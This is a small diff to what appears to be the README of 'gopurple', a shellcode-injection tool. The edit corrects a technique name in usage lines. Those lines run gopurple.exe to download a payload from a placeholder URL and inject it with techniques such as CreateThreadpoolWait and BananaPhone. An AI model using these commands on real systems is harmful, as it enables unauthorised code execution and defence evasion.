@@ -103,7 +103,7 @@ nonms = only DLLs that are signed by Microsoft can hook into the process
 
 onlystore = only Microsoft store application's process can hook into the process  
 
-12 -  gopurple.exe -u urlhostingpayload -t 12 (CreateThreadpoolWaitpool)
+12 -  gopurple.exe -u urlhostingpayload -t 12 (CreateThreadpoolWait)
  
 13 - gopurple.exe -u urlhostingpayload -t 13 (BananaPhone)
 ```
